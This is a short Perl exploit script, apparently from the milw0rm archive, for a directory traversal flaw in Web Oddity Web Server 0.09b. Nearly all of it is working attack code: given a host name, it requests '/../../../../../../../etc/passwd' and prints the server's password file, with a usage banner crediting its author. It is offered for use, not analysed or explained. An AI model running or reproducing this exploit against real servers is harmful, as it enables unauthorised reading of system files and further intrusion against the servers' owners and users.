# Web Oddity Web Server 0.09b Directory Transversal Vulnerability
# Found by: Katatafish (karatatata@hush.com)
# Download: http://sourceforge.net/project/showfiles.php?group_id=13854
# Thanks: str0ke

use LWP::Simple;
use strict;

sub usage
{
       print "----------------------------------------------------- - -----------\n";
       print "Web Oddity Web Server 0.09b Directory Transversal Vulnerability\n";
       print "\n";
       print "usage: $0 www.site.com\n";
       print "------------------------------------------------- Katatafish-----\n";
       exit ();
}

my $host=shift || &usage;
getprint 'http://' . $host . '/../../../../../../../etc/passwd';

# milw0rm.com [2007-09-04]